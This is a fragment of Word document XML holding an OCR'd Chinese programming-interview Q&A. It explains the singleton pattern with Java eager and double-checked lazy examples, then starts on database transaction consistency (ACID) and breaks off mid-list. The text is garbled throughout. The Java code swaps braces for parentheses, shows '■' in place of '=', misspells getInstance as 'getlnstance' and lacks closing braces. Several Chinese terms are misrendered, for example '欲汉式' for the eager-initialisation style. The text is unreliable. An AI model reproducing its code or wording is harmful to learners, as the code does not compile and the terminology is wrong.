        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="900"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="260" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="272" w:name="bookmark283"/>
      <w:bookmarkEnd w:id="272"/>
      <w:bookmarkStart w:id="273" w:name="bookmark284"/>
      <w:bookmarkStart w:id="274" w:name="bookmark281"/>
      <w:bookmarkStart w:id="275" w:name="bookmark282"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>请问如何保证単例模式只有唯一实例？你知道的都有哪</w:t>
      </w:r>
      <w:bookmarkEnd w:id="273"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="276" w:name="bookmark285"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>些方法？</w:t>
      </w:r>
      <w:bookmarkEnd w:id="274"/>
      <w:bookmarkEnd w:id="275"/>
      <w:bookmarkEnd w:id="276"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>单例的实现主要是通过以下两个步骤：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>将该类的构造方法定义为私有方法,这样其他处的代码就无法通过调用该类的构造方法 来实例化该类的对象，只有通过该类提供的静态方法来得到该类的唯一实例；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>在该类内提供一个静态方法，当我们调用玄个方法时，如果类持有的引用不为空就返回 这个引用，如果类保持的引用为空就创建:•亥类的实例并将实例的引用赋予该类保持的引 用。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>单例模式的实现主要有两种一种是欲汉式，一种是懒汉式。欲汉式线程安全的单例模式 如下：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="33"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="220" w:line="346" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="540"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>public class Singleton (</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="33"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="220" w:line="346" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="980"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>private final static Singleton INSTANCE ■ new Singleton();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="33"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="220" w:line="346" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="980"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>private Singleton()(}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="33"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="980"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>public static Singleton getlnstance()(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="33"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="880" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1440" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return INSTANCE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="270" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>懒汉式线程安全的单例模式如下</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="33"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="260" w:line="298" w:lineRule="auto"/>
        <w:ind w:left="1200" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>public class Singleton (</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="33"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="260" w:line="298" w:lineRule="auto"/>
        <w:ind w:left="1620" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">private static volatile </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Singleton singleton;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="33"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="260" w:line="298" w:lineRule="auto"/>
        <w:ind w:left="1620" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">private </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Singleton()()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="33"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="298" w:lineRule="auto"/>
        <w:ind w:left="2080" w:right="0" w:hanging="460"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">public static Singleton getlnstance () ( if </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(singleton == null) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="33"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="800" w:line="298" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">synchronized </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Singleton.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">class) { if </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(singleton == null)( singleton = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">new </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Singleton();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="33"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="1260" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2080" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">return </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>singleton;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="277" w:name="bookmark288"/>
      <w:bookmarkEnd w:id="277"/>
      <w:bookmarkStart w:id="278" w:name="bookmark286"/>
      <w:bookmarkStart w:id="279" w:name="bookmark287"/>
      <w:bookmarkStart w:id="280" w:name="bookmark289"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>请问数据库事物的一致性</w:t>
      </w:r>
      <w:bookmarkEnd w:id="278"/>
      <w:bookmarkEnd w:id="279"/>
      <w:bookmarkEnd w:id="280"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>事务</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Transaction)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是由一系列对系统中数据进行访问与更新的操作所组成的一个程 序执行逻辑单元。事务是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>DBMS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中最基础的单位，事务不可分割。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="260" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>事务具有4个基本特征，分别是：原子性</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Atomicity)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>、一致性</w:t>
      </w:r>
      <w:r>
